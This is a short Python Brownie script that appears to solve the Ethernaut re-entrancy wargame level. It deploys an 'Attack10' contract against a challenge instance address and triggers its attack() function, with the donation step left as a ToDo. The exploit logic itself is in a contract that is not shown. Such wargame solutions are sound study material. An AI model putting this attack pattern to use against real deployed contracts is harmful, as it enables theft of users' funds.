from scripts.helpful_scripts import get_account
from brownie import web3, Attack10, interface

ETHERNAUT_INSTANCE = "0x58C7cdda21c43803DcFE82CE7E41926816df7bb9"
AMOUNT = "0.01 ether"
GAS_LIMIT = 6000000


def main():

    # set player account
    player = get_account()
    # set target (interface address)
    target = interface.ReentrantInterface(ETHERNAUT_INSTANCE)
    print(f"Target address under attack = {target}")

    # deploy attack contract
    attack = Attack10.deploy(ETHERNAUT_INSTANCE, AMOUNT, {"from": player})

    # donate ether to the target contract
    # ToDo

    # call the attack() function, on my attack contract
    attack.attack({"from": player, "allow_revert": True, "gas_limit": GAS_LIMIT})
